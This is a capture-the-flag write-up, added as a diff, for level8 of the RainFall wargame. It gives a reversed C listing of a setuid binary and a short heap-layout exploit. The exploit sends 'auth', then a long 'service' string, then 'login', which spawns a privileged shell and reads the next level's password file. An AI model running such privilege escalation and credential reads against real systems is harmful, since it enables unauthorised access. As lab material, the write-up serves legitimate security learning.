@@ -1,0 +1,76 @@
+
+```bash
+level8@RainFall:~$ ls -la
+-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
+
+level8@RainFall:~$ file level8
+level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
+```
+
+Reversed in c:
+```c
+char **auth;
+char *service;
+
+int main(int argc, const char **argv, const char **envp)
+{
+  char s[136];
+
+  while (1)
+  {
+    printf("%p, %p \n", auth, service);
+
+    if (fgets(s, 128, stdin) == 0)
+    {
+      break;
+    }
+
+    if (memcmp(s, "auth ", 5u) == 0)
+    {
+      auth = malloc(4u);
+      *auth = NULL;
+      if (strlen(&s[5]) <= 30u)
+      {
+        strcpy((char *)auth, &s[5]);
+      }
+    }
+
+    if (memcmp(s, "reset", 5u) == 0)
+    {
+      free(auth);
+    }
+
+    if (memcmp(s, "service", 6u) == 0)
+    {
+      service = strdup(&s[7]);
+    }
+
+    if (memcmp(s, "login", 5u) == 0)
+    {
+      if (auth[8] != '\0')
+      {
+        system("/bin/sh");
+      }
+      else
+      {
+        fwrite("Password:\n", 1u, 10u, stdout);
+      }
+    }
+  }
+  return 0;
+}
+```
+
+It is really easy, we call `auth AAAA` to set the auth pointer and call `service ...` with enough value so `auth[8]` is not equal to zero, then we can call `login` to pawn a terminal of next level.
+
+```bash
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth AAAA
+0x804a008, (nil) 
+serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+0x804a008, 0x804a018 
+login
+$ cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
